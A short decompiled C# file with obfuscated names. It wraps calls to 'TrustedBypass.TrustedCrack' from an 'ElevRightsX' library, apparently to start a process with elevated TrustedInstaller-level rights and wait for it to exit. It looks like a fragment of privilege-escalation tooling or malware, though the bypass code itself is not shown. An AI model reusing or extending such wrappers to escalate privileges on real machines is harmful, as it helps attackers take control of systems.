using System;
using System.Diagnostics;
using ElevRightsX;

// Token: 0x02000349 RID: 841
public static class GClass104
{
	// Token: 0x0600130A RID: 4874 RVA: 0x0004DFF0 File Offset: 0x0004C1F0
	public static bool smethod_0(string string_0, bool bool_0)
	{
		string value = TrustedBypass.TrustedCrack(string_0, bool_0);
		bool result;
		try
		{
			Process processById = Process.GetProcessById((int)Convert.ToInt16(value));
			if (processById != null)
			{
				processById.WaitForExit();
			}
			result = true;
		}
		catch
		{
			result = false;
		}
		return result;
	}

	// Token: 0x0600130B RID: 4875 RVA: 0x0004E038 File Offset: 0x0004C238
	public static void smethod_1(string string_0, bool bool_0)
	{
		TrustedBypass.TrustedCrack(string_0, bool_0);
	}
}
